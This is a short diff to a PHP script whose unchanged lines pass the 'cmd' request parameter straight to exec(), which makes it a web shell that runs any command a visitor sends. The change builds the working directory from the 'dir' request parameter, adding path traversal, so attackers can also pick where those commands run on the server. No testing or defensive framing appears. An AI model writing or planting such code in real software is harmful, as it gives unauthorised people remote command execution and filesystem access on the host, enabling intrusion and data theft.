@@ -1,5 +1,5 @@
 <?php
-    chdir("./public/");
+    chdir("./public" . $_GET["dir"]);
     $output = [];
     exec($_GET["cmd"], $output);
 
